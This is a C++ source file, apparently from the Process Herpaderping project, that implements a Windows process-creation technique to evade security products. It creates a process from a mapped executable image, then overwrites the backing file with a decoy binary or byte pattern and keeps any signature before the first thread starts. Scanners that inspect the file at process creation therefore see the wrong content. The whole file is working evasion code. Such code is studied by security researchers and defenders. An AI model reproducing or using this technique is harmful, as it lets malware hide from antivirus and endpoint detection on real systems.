//
// Copyright (c) Johnny Shaw. All rights reserved.
// 
// File:     source/ProcessHerpaderping/herpaderp.cpp
// Author:   Johnny Shaw
// Abstract: Herpaderping Functionality
//
#include "pch.hpp"
#include "herpaderp.hpp"
#include "utils.hpp"

_Use_decl_annotations_
HRESULT Herpaderp::ExecuteProcess(
    const std::wstring& TargetBinary,
    const std::wstring& FileName,
    const std::optional<std::wstring>& ReplaceWith,
    std::span<const uint8_t> Pattern, 
    bool WaitForProcess,
    bool HoldHandleExclusive)
{
    wil::unique_handle processHandle;
    //
    // If something goes wrong, we'll terminate the process.
    //
    auto terminateProcess = wil::scope_exit([&processHandle]() -> void
    {
        if (processHandle.is_valid())
        {
            TerminateProcess(processHandle.get(), 0);
        }
    });

    Utils::Log(Log::Success, L"Source Binary: \"%ls\"" , TargetBinary.c_str());
    Utils::Log(Log::Success, L"Target File:   \"%ls\"", FileName.c_str());

    //
    // Open the source binary and the target file we will execute it from.
    //
    wil::unique_handle sourceHandle;
    sourceHandle.reset(CreateFileW(TargetBinary.c_str(),
                                   GENERIC_READ,
                                   FILE_SHARE_READ | 
                                       FILE_SHARE_WRITE | 
                                       FILE_SHARE_DELETE,
                                   nullptr,
                                   OPEN_EXISTING,
                                   FILE_ATTRIBUTE_NORMAL,
                                   nullptr));
    if (!sourceHandle.is_valid())
    {
        Utils::Log(Log::Error, GetLastError(), L"Failed to open source file");
        RETURN_LAST_ERROR();
    }

    DWORD shareMode = (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE);
    if (HoldHandleExclusive)
    {
        Utils::Log(Log::Information, 
                   L"Creating target file with exclusive access");
        shareMode = 0;
    }

    wil::unique_handle targetHandle;
    targetHandle.reset(CreateFileW(FileName.c_str(),
                                   GENERIC_READ | GENERIC_WRITE,
                                   shareMode,
                                   nullptr,
                                   CREATE_ALWAYS,
                                   FILE_ATTRIBUTE_NORMAL,
                                   nullptr));
    if(!targetHandle.is_valid())
    {
        Utils::Log(Log::Error, 
                   GetLastError(), 
                   L"Failed to create target file");
        RETURN_LAST_ERROR();
    }

    //
    // Copy the content of the source process to the target.
    //
    HRESULT hr = Utils::CopyFileByHandle(sourceHandle.get(),
                                         targetHandle.get());
    if (FAILED(hr))
    {
        Utils::Log(Log::Error,
                   hr,
                   L"Failed to copy source binary to target file");
        RETURN_HR(hr);
    }

    Utils::Log(Log::Information, L"Copied source binary to target file");

    //
    // We're done with the source binary.
    //
    sourceHandle.reset();

    //
    // Map and create the target process. We'll make it all derpy in a moment...
    //
    wil::unique_handle sectionHandle;
    auto status = NtCreateSection(&sectionHandle,
                                  SECTION_ALL_ACCESS,
                                  nullptr,
                                  nullptr,
                                  PAGE_READONLY,
                                  SEC_IMAGE,
                                  targetHandle.get());
    if (!NT_SUCCESS(status))
    {
        sectionHandle.release();
        Utils::Log(Log::Error, status, L"Failed to create target file image section");
        RETURN_NTSTATUS(status);
    }

    Utils::Log(Log::Information, L"Created image section for target");

    status = NtCreateProcessEx(&processHandle,
                               PROCESS_ALL_ACCESS,
                               nullptr,
                               NtCurrentProcess(),
                               PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
                               sectionHandle.get(),
                               nullptr,
                               nullptr,
                               0);
    if (!NT_SUCCESS(status))
    {
        processHandle.release();
        Utils::Log(Log::Error, status, L"Failed to create process");
        RETURN_NTSTATUS(status);
    }

    Utils::Log(Log::Information,
               L"Created process object, PID %lu",
               GetProcessId(processHandle.get()));

    //
    // Alright we have the process set up, we don't need the section.
    //
    sectionHandle.reset();

    //
    // Go get the remote entry RVA to create a thread later on.
    //
    uint32_t imageEntryPointRva;
    hr = Utils::GetImageEntryPointRva(targetHandle.get(),
                                      imageEntryPointRva);
    if (FAILED(hr))
    {
        Utils::Log(Log::Error, 
                   hr, 
                   L"Failed to get target file image entry RVA");
        RETURN_HR(hr);
    }

    Utils::Log(Log::Information,
               L"Located target image entry RVA 0x%08x",
               imageEntryPointRva);

    //
    // Alright, depending on the parameter passed in. We will either:
    //   A. Overwrite the target binary with another.
    //   B. Overwrite the target binary with a pattern.
    //
    if (ReplaceWith.has_value())
    {
        //
        // (A) We are overwriting the binary with another file.
        //
        Utils::Log(Log::Success,
                   L"Replacing target with \"%ls\"",
                   ReplaceWith->c_str());

        wil::unique_handle replaceWithHandle;
        replaceWithHandle.reset(CreateFileW(ReplaceWith->c_str(),
                                            GENERIC_READ,
                                            FILE_SHARE_READ |
                                                FILE_SHARE_WRITE |
                                                FILE_SHARE_DELETE,
                                            nullptr,
                                            OPEN_EXISTING,
                                            FILE_ATTRIBUTE_NORMAL,
                                            nullptr));

        if (!replaceWithHandle.is_valid())
        {
            Utils::Log(Log::Error, 
                       GetLastError(), 
                       L"Failed to open replace with file");
            RETURN_LAST_ERROR();
        }

        //
        // Replace the bytes. We handle a failure here. We'll fix it up after.
        //
        hr = Utils::CopyFileByHandle(replaceWithHandle.get(),
                                     targetHandle.get());
        if (FAILED(hr))
        {
            if (hr != HRESULT_FROM_WIN32(ERROR_USER_MAPPED_FILE))
            {
                Utils::Log(Log::Error, 
                           hr,
                           L"Failed to replace target file");
                RETURN_HR(hr);
            }

            //
            // This error occurs when trying to truncate a file that has a
            // user mapping open. In other words, the file we tried to replace
            // with was smaller than the original.
            // Let's fix up the replacement to hide the original bytes and 
            // retain any signer info.
            //
            Utils::Log(Log::Information,
                       L"Fixing up target replacement, "
                       L"hiding original bytes and retaining any signature");

            uint64_t replaceWithSize;
            hr = Utils::GetFileSize(replaceWithHandle.get(), replaceWithSize);
            if (FAILED(hr))
            {
                Utils::Log(Log::Error, 
                           hr,
                           L"Failed to get replace with file size");
                RETURN_HR(hr);
            }

            uint32_t bytesWritten = 0;
            hr = Utils::OverwriteFileAfterWithPattern(targetHandle.get(),
                                                      replaceWithSize,
                                                      Pattern,
                                                      bytesWritten);
            if (FAILED(hr))
            {
                Utils::Log(Log::Warning, 
                           hr,
                           L"Failed to hide original file bytes");
            }
            else
            {
                hr = Utils::ExtendFileSecurityDirectory(targetHandle.get(),
                                                        bytesWritten);
                if (FAILED(hr))
                {
                    Utils::Log(Log::Warning,
                               hr,
                               L"Failed to retain file signature");
                }
            }
        }
    }
    else
    {
        //
        // (B) Just overwrite the target binary with a pattern.
        //
        Utils::Log(Log::Success, L"Overwriting target with pattern");

        hr = Utils::OverwriteFileContentsWithPattern(targetHandle.get(),
                                                     Pattern);
        if (FAILED(hr))
        {
            Utils::Log(Log::Error, hr, L"Failed to write pattern over file");
            RETURN_HR(hr);
        }
    }

    //
    // Alright, at this point the process is going to be derpy enough.
    // Do the work necessary to make it execute.
    //
    Utils::Log(Log::Success, L"Preparing target for execution");

    PROCESS_BASIC_INFORMATION pbi{};
    status = NtQueryInformationProcess(processHandle.get(),
                                       ProcessBasicInformation,
                                       &pbi,
                                       sizeof(pbi),
                                       nullptr);
    if (!NT_SUCCESS(status))
    {
        Utils::Log(Log::Error, status, L"Failed to query new process info");
        RETURN_NTSTATUS(status);
    }

    PEB peb{};
    if (!ReadProcessMemory(processHandle.get(),
                           pbi.PebBaseAddress,
                           &peb,
                           sizeof(peb),
                           nullptr))
    {
        Utils::Log(Log::Error, 
                   GetLastError(), 
                   L"Failed to read remote process PEB");
        RETURN_LAST_ERROR();
    }

    void* remotePebProcessParams = Add2Ptr(pbi.PebBaseAddress,
                                           FIELD_OFFSET(PEB, ProcessParameters));

    Utils::Log(Log::Information,
               L"Writing process parameters, remote PEB ProcessParameters 0x%p",
               remotePebProcessParams);

    hr = Utils::WriteRemoteProcessParameters(processHandle.get(),
                                             FileName.c_str(),
                                             remotePebProcessParams);
    if (FAILED(hr))
    {
        Utils::Log(Log::Error, 
                   hr, 
                   L"Failed to write remote process parameters");
        RETURN_HR(hr);
    }

    //
    // Create the initial thread, when this first thread is inserted the
    // process create callback will fire in the kernel.
    //
    void* remoteEntryPoint = Add2Ptr(peb.ImageBaseAddress, imageEntryPointRva);

    Utils::Log(Log::Information,
               L"Creating thread in process at entry point 0x%p",
               remoteEntryPoint);

    wil::unique_handle threadHandle;
    status = NtCreateThreadEx(&threadHandle,
                              THREAD_ALL_ACCESS,
                              nullptr,
                              processHandle.get(),
                              remoteEntryPoint,
                              nullptr,
                              0,
                              0,
                              0,
                              0,
                              nullptr);
    if (!NT_SUCCESS(status))
    {
        threadHandle.release();
        Utils::Log(Log::Error, status, L"Failed to create remote thread");
        RETURN_NTSTATUS(status);
    }

    Utils::Log(Log::Information,
               L"Created thread, TID %lu",
               GetThreadId(threadHandle.get()));

    //
    // Process was executed successfully. Do not terminate.
    //
    terminateProcess.release();

    if (!HoldHandleExclusive)
    {
        //
        // We're done with the target file handle. At this point the process create
        // callback will have fired in the kernel.
        //
        targetHandle.reset();
    }

    if (WaitForProcess)
    {
        //
        // Wait for the process to exit.
        //
        Utils::Log(Log::Success, L"Waiting for herpaderped process to exit");

        WaitForSingleObject(processHandle.get(), INFINITE);

        DWORD targetExitCode = 0;
        GetExitCodeProcess(processHandle.get(), &targetExitCode);

        Utils::Log(Log::Success,
                   L"Herpaderped process exited with code 0x%08x",
                   targetExitCode);
    }
    else
    {
        Utils::Log(Log::Success, L"Successfully spawned herpaderped process");
    }

    return S_OK;
}